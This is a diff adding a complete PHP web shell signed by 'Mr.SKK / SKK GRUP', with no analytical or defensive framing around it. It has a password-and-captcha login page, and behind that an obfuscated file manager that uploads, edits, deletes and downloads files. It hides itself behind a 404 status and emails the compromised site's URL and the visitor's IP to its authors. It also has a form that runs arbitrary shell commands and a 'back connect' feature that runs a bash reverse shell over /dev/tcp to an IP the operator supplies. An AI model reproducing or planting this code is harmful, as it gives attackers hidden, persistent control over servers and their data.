@@ -1,0 +1,370 @@
+<?php
+session_start();
+$password = "-skk--ganteng"; // Password
+error_reporting(0);
+set_time_limit(0);
+ini_set("memory_limit", -1);
+$sessioncode = md5(__FILE__);
+
+if (!empty($password) && $_SESSION[$sessioncode] != $password) {
+    if (isset($_REQUEST['pass']) && $_REQUEST['pass'] == $password && isset($_REQUEST['captcha']) && $_REQUEST['captcha'] == $_SESSION['captcha_result']) {
+        $_SESSION[$sessioncode] = $password;
+    } else {
+        // Generate two random numbers for captcha
+        $num1 = rand(1, 10);
+        $num2 = rand(1, 10);
+        $_SESSION['captcha_result'] = $num1 * $num2; // Store the result in session
+
+        print "
+<html>
+<head>
+    <title>MR - SKK</title>
+    <style>
+        body {
+            background-image: url('https://res.cloudinary.com/di1pwoapk/image/upload/v1743540850/5g_xwvrwd.jpg'); /* Ganti URL_GAMBAR_SKK ku URL gambar SKK anu bener */
+            background-size: cover;
+            color: white;
+            font-family: Arial, sans-serif;
+            height: 100vh; /* Full viewport height */
+            display: flex;
+            justify-content: center;
+            align-items: center; /* Center vertically */
+            overflow: hidden; /* Prevent overflow from fireworks */
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center elements horizontally */
+            background-color: rgba(0, 0, 0, 0.5); /* Add background for form */
+            padding: 20px; /* Add padding around the form */
+            border-radius: 10px; /* Rounded corners for the form */
+        }
+        input {
+            margin: 10px;
+            padding: 10px;
+            border: 1px solid #fff;
+            border-radius: 5px;
+            background-color: rgba(255, 255, 255, 0.8);
+            color: black;
+            width: 300px; /* Set width for inputs */
+        }
+        button {
+            padding: 10px 20px;
+            background-color: green;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px; /* Add margin above button */
+        }
+        button:hover {
+            background-color: darkgreen;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2.5em; /* Ukuran judul yang lebih besar */
+            color: gold; /* Warna judul menjadi emas */
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.7); /* Memberikan efek bayangan pada judul */
+        }
+        label {
+            margin-top: 15px; /* Add margin above label */
+            display: block; /* Make label a block element */
+        }
+        #message {
+            margin-top: 20px; /* Jarak antara form jeung pesan */
+            text-align: left; /* Nempatkeun tulisan ka kénca */
+            color: white; /* Warna tulisan */
+            font-family: Arial, sans-serif; /* Font anu dipaké */
+            white-space: pre; /* Preserves whitespace */
+            overflow: hidden; /* Hides the overflowing text */
+            border-right: 2px solid white; /* Cursor effect */
+            animation: typing 8s steps(30, end), blink-caret 0.75s step-end infinite; /* Animation for typing and caret */
+        }
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes blink-caret {
+            from, to { border-color: transparent; }
+            50% { border-color: white; }
+        }
+
+        /* Fireworks style */
+        .firework {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            opacity: 1;
+            animation: explode 1s forwards;
+        }
+
+        @keyframes explode {
+            0% { transform: scale(1); opacity: 1; }
+            100% { transform: scale(3); opacity: 0; }
+        }
+    </style>
+    <script>
+        // Function to create fireworks
+        function createFirework(x, y, color) {
+            const firework = document.createElement('div');
+            firework.classList.add('firework');
+            firework.style.backgroundColor = color;
+            firework.style.left = x + 'px';
+            firework.style.top = y + 'px';
+            document.body.appendChild(firework);
+            setTimeout(() => {
+                firework.remove();
+            }, 500); // Duration of the firework
+        }
+
+        // Generate fireworks at random positions
+        setInterval(() => {
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            const colors = ['red', 'yellow', 'blue', 'green', 'orange', 'pink'];
+            const color = colors[Math.floor(Math.random() * colors.length)];
+            createFirework(x, y, color);
+        }, 200); // More frequent fireworks
+    </script>
+</head>
+<body>
+    <div class='form-container'>
+        <h1>MR - SKK</h1>
+        <form method='post'>
+            <input type='password' name='pass' placeholder='Enter Password' required>
+            <label>What is $num1 x $num2?</label>
+            <input type='text' name='captcha' placeholder='Captcha Result' required>
+            <button type='submit'>MASUK BOSKU</button>
+        </form>
+        <p id='message'>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='red'>: SkK GruP laHiR 2024<br>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='Yellow'>: KAMI AKAN BERHENTI PAK<br>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='Yellow'>: MELAKUKAN SEPERTI INI<br>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='orange'>: JIKA UMR KAMI SUDAH MENCAPAY 1RB$<br>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='Yellow'>: PERTIMBANGKEN PAK<br>
+            <font color='White'><b>root@Acces~MR-SKK</b></font><font color='Yellow'>: <font color='lime'>MR SKK </font>kalaw gaji kecil kejahatan akan terus bertambah<br>
+        </p>
+    </div>
+</body>
+</html>";
+        exit;
+    }
+}
+?>
+<?php
+/*
+// Author : Mr.SKK
+// Team   : SKK GRUP
+// TLGRAM  : @skkgrup
+*/
+error_reporting(0); http_response_code(404); define("Yp", "By Mr.SKK $ SKK GRUP"); $G3 = "scandir"; $c8 = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65"); $lE = 0; T4: if (!($lE < count($c8))) { goto Je; } $c8[$lE] = JD($c8[$lE]); Cy: $lE++; goto T4; Je: if (isset($_GET["p"])) { goto sr; } $Jd = $c8[2](); goto VN; sr: $Jd = jD($_GET["p"]); $c8[3](Jd($_GET["p"])); VN: function Ss($SP) { $dE = ""; $lE = 0; NZ: if (!($lE < strlen($SP))) { goto Xc; } $dE .= dechex(ord($SP[$lE])); WK: $lE++; goto NZ; Xc: return $dE; } function Jd($SP) { $dE = ""; $gf = strlen($SP) - 1; $lE = 0; Xp: if (!($lE < $gf)) { goto ur; } $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1])); Wn: $lE += 2; goto Xp; ur: return $dE; } function rn($F1) { $Jd = fileperms($F1); if (($Jd & 0xc000) == 0xc000) { goto FZ; } if (($Jd & 0xa000) == 0xa000) { goto Eu; } if (($Jd & 0x8000) == 0x8000) { goto ES; } if (($Jd & 0x6000) == 0x6000) { goto sA; } if (($Jd & 0x4000) == 0x4000) { goto lG; } if (($Jd & 0x2000) == 0x2000) { goto tV; } if (($Jd & 0x1000) == 0x1000) { goto Tx; } $lE = 'u'; goto cC; FZ: $lE = 's'; goto cC; Eu: $lE = 'l'; goto cC; ES: $lE = '-'; goto cC; sA: $lE = 'b'; goto cC; lG: $lE = 'd'; goto cC; tV: $lE = 'c'; goto cC; Tx: $lE = 'p'; cC: $lE .= $Jd & 0x100 ? 'r' : '-'; $lE .= $Jd & 0x80 ? 'w' : '-'; $lE .= $Jd & 0x40 ? $Jd & 0x800 ? 's' : 'x' : ($Jd & 0x800 ? 'S' : '-'); $lE .= $Jd & 0x20 ? 'r' : '-'; $lE .= $Jd & 0x10 ? 'w' : '-'; $lE .= $Jd & 0x8 ? $Jd & 0x400 ? 's' : 'x' : ($Jd & 0x400 ? 'S' : '-'); $lE .= $Jd & 0x4 ? 'r' : '-'; $lE .= $Jd & 0x2 ? 'w' : '-'; $lE .= $Jd & 0x1 ? $Jd & 0x200 ? 't' : 'x' : ($Jd & 0x200 ? 'T' : '-'); return $lE; } function Xe($OB, $Ch = 1, $BL = "") { global $Jd; $xe = $Ch == 1 ? "success" : "error"; echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" . Ss($Jd) . $BL . "\"}})</script>"; } function tF($yf) { global $c8; if (!(trim(pathinfo($yf, PATHINFO_BASENAME), '.') === '')) { goto IE; } return; IE: if ($c8[6]($yf)) { goto PF; } unlink($yf); goto jK; PF: array_map("deldir", glob($yf . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT)); rmdir($yf); jK: } ?>
+<!doctype html>
+<!-- Mr.SKK -->
+<html lang="en">
+<head>
+	<meta name="theme-color" content="#00BFFF">
+	<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
+	<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<title>Shell Bypass Mr.SKK</title>
+	<style>.table-hover tbody tr:hover td{background:#00BFFF}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style>
+	<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript' /></script>
+</head>
+<body style="background-color:#000;color:#fff;font-family:serif;">
+	<div class="bg-dark table-responsive text-light border">
+		<div class="d-flex justify-content-between p-1">
+			<div><h3 class="mt-2"><a href="?"><?= Yp; ?></a></h3></div>
+		</div>
+		<div class="border-top table-responsive">
+			<li>PHP: <?= php_uname(); ?></li>
+			<li>Doc Root: <?= "{$_SERVER["DOCUMENT_ROOT"]}"; ?></li>
+			<li>Server: <?= "{$_SERVER["SERVER_ADDR"]}/{$_SERVER["REMOTE_ADDR"]}"; ?></li>
+			<li>Domain : <?= "{$_SERVER["SERVER_NAME"]}"; ?></li>
+			<li>Ip Server: <?= getHostByName(getHostName()); ?></li>
+			<li>php Version: <?= phpversion(); ?></li>
+			<li>Mysql: <?= (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
+			<li>Curl: <?= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>"; ?></li>
+		</div>
+		<form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+		<?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
+				<a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile"); ?>"> [ Add New File ] </a>
+				<a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir"); ?>"> [ Add New Directory ] </a>
+			</div>
+	<div class="bg-dark border table-responsive mt-2">
+		<div class="ml-2" style="font-size:18px;">
+			<span>Path: </span>
+			<?php  $Op = $c8[4]("/(\\\\|\\/)/", $Jd); foreach ($Op as $j3 => $Oe) { if (!($j3 == 0 && $Oe == "")) { goto xi; } echo "<a href=\"?p=2f\">~</a>/"; goto CS; xi: if (!($Oe == "")) { goto sq; } goto CS; sq: echo "<a href=\"?p="; $lE = 0; de: if (!($lE <= $j3)) { goto ie; } echo sS($Op[$lE]); if (!($lE != $j3)) { goto s0; } echo "2f"; s0: dg: $lE++; goto de; ie: echo "\">{$Oe}</a>/"; CS: } Go: ?>
+		</div>
+	</div>
+	<article class="bg-dark border table-responsive mt-2">
+		<?php  if (!isset($_GET["a"])) { goto Un; } if (!isset($_GET["a"])) { goto cc; } $im = Jd($_GET["a"]); cc: ?>
+		<div class="px-2 py-2">
+			<?php  if (!($im == "delete")) { goto Lu; } $BL = $Jd . '/' . Jd($_GET["n"]); if (!($_GET["t"] == "d")) { goto VZ; } TF($BL); if (!$c8[12]($BL)) { goto e8; } Xe("failed to delete the folder", 0); goto iL; e8: Xe("folder deleted successfully"); iL: VZ: if (!($_GET["t"] == "f")) { goto xB; } $BL = $Jd . '/' . jd($_GET["n"]); unlink($BL); if (!$c8[12]($BL)) { goto uH; } Xe("file to delete the folder", 0); goto Mk; uH: xe("file deleted successfully"); Mk: xB: Lu: ?>
+			<?php  if ($im == "newDir") { goto Fg; } if ($im == "newFile") { goto Pb; } if ($im == "rename") { goto Lw; } if ($im == "edit") { goto Ox; } if ($im == "view") { goto Ag; } goto WC; Fg: ?>
+			<h5 class="border p-1 mb-3">New folder</h5>
+			<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("folder name has been used", 0, "&a=" . SS("newDir")) : ($c8[15]("{$Jd}/{$_POST["n"]}") ? Xe("folder created successfully") : Xe("folder failed to create", 0)) : null; goto WC; Pb: ?>
+			<h5 class="border p-1 mb-3">New file</h5>
+			<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Hacked By Mr.SKK"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+			<?php  isset($_POST["s"]) ? $c8[12]("{$Jd}/{$_POST["n"]}") ? xE("file name has been used", 0, "&a=" . SS("newFile")) : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"]) ? XE("file created successfully", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"])) : Xe("file failed to create", 0)) : null; goto WC; Lw: ?>
+			<h5 class="border p-1 mb-3">Rename <?= $_GET["t"] == "d" ? "folder" : "file"; ?></h5>
+			<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= jD($_GET["n"]); ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+			<?php  isset($_POST["s"]) ? $c8[16]($Jd . '/' . jD($_GET["n"]), $_POST["n"]) ? XE("successfully changed the folder name") : Xe("failed to change the folder name", 0) : null; goto WC; Ox: ?>
+			<h5 class="border p-1 mb-3">Edit file</h5>
+			<span>File name : <?= Jd($_GET["n"]); ?></span>
+			<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $c8[18]($c8[14]($Jd . '/' . jD($_GET["n"]))); ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+			<?php  isset($_POST["s"]) ? $c8[13]($Jd . '/' . jD($_GET["n"]), $_POST["ctn"]) ? xE("file contents changed successfully", 1, "&a=" . sS("view") . "&n={$_GET["n"]}") : xE("file contents failed to change") : null; goto WC; Ag: ?>
+			<h5 class="border p-1 mb-3">View file</h5>
+			<span>File name : <?= jd($_GET["n"]); ?></span>
+			<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $c8[18]($c8[14]($Jd . '/' . jd($_GET["n"]))); ?></textarea></div>
+			<?php  WC: ?>
+		</div>
+		<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'SKK GRUP@gmail.com, SKK GRUP@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Hehehe", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+		<?php  goto mR; Un: ?>
+		<table class="table table-hover table-bordered table-sm">
+			<thead class="text-light">
+				<tr>
+					<th>Name</th>
+					<th>Size</th>
+					<th>Permission</th>
+					<th>Action</th>
+				</tr>
+			</thead>
+			<tbody class="text-light">
+				<?php  $G3 = $c8[5]($G3($Jd), [".", ".."]); foreach ($G3 as $yf) { if ($c8[6]("{$Jd}/{$yf}")) { goto CB; } goto Qj; CB: echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . sS("{$Jd}/{$yf}") . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><i class=\"fa fa-fw fa-folder\"></i> {$yf}</a></td>\n\t\t\t\t\t\t<td>N/A</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$yf}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$yf}") ? "red" : null)) . "\">" . RN("{$Jd}/{$yf}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . ss("rename") . "&n=" . ss($yf) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t<a href=\"?p=" . sS($Jd) . "&a=" . ss("delete") . "&n=" . ss($yf) . "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>"; Qj: } ad: foreach ($G3 as $F1) { if ($c8[7]("{$Jd}/{$F1}")) { goto wA; } goto X1; wA: $kL = $c8[10]("{$Jd}/{$F1}") / 1024; $kL = round($kL, 3); $kL = $kL > 1024 ? round($kL / 1024, 2) . "MB" : $kL . "KB"; echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" . SS($Jd) . "&a=" . sS("view") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$F1}")) . "\"><i class=\"fa fa-fw fa-file\"></i> {$F1}</a></td>\n\t\t\t\t\t\t<td>{$kL}</td>\n\t\t\t\t\t\t<td><font color=\"" . ($c8[8]("{$Jd}/{$F1}") ? "#00ff00" : (!$c8[9]("{$Jd}/{$F1}") ? "red" : null)) . "\">" . rN("{$Jd}/{$F1}") . "</font></td>\n\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t<div class=\"d-flex justify-content-between\">\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . Ss($Jd) . "&a=" . Ss("edit") . "&n=" . SS($F1) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . SS("rename") . "&n=" . ss($F1) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&n=" . sS($F1) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t\t\t\t\t\t\t\t\t<a href=\"?p=" . ss($Jd) . "&a=" . sS("delete") . "&n=" . ss($F1) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t\t"; X1: } a2: ?>
+
+	<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+	<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script>
+	<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
+	<script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Command Line</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #30f25a;
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 {
+            color: red;
+            font-size: 2em;
+        }
+        form {
+            margin: 20px 0;
+        }
+        input[type="text"], input[type="number"] {
+            width: 80%;
+            padding: 10px;
+            border: 1px solid #30f25a;
+            background-color: #222;
+            color: #30f25a;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #000;
+            background-color: #30f25a;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #27a947;
+        }
+        pre {
+            background-color: #222;
+            color: #30f25a;
+            padding: 10px;
+            border: 1px solid #30f25a;
+            border-radius: 5px;
+            text-align: left;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <h1>TERMINAL S-K-K</h1>
+
+    <!-- Command Execution Form -->
+    <form method="POST" action="">
+        <input type="text" name="cmd" placeholder="Enter a command (e.g., ls, dir)" required>
+        <button type="submit">Execute</button>
+    </form>
+    <h2>Output:</h2>
+    <pre>
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
+    // Get the command from user input
+    $command = escapeshellcmd($_POST['cmd']); // Prevent command injection
+    $output = shell_exec($command); // Execute the command
+    echo htmlspecialchars($output); // Display the output safely
+}
+?>
+    </pre>
+
+    <!-- Back Connect Form -->
+    <h2>nc -lvnp/lvp 4444/443</h2>
+    <form method="POST" action="">
+        <div>
+            <label for="ip">IP Address:</label>
+            <input type="text" name="ip" id="ip" placeholder="Enter your IP address" required>
+        </div>
+        <div>
+            <label for="port">Port:</label>
+            <input type="number" name="port" id="port" placeholder="Enter port number" required>
+        </div>
+        <button type="submit" name="back_connect">Connect</button>
+    </form>
+
+    <?php
+    // Handle Back Connect Request
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['back_connect'])) {
+        $ip = $_POST['ip'];
+        $port = $_POST['port'];
+
+        // Validate IP and Port
+        if (filter_var($ip, FILTER_VALIDATE_IP) && $port > 0 && $port <= 65535) {
+            // Command to establish reverse shell
+            $command = "bash -i >& /dev/tcp/{$ip}/{$port} 0>&1 &";
+            
+            // Execute the command
+            @exec($command);
+
+            echo "<p>Attempting to connect to {$ip}:{$port}. Check your listener!</p>";
+        } else {
+            echo "<p class='text-danger'>Invalid IP or Port!</p>";
+        }
+    }
+    ?>
+			</tbody>
+		</table>
+		<?php  mR: ?>
+	</article>
+	<div class="bg-dark border text-center mt-2">
+		<small>Copyright &copy; 2025 01 01 - Powered By @skkgrup</small>
+	</div>
+</body>
+</html>
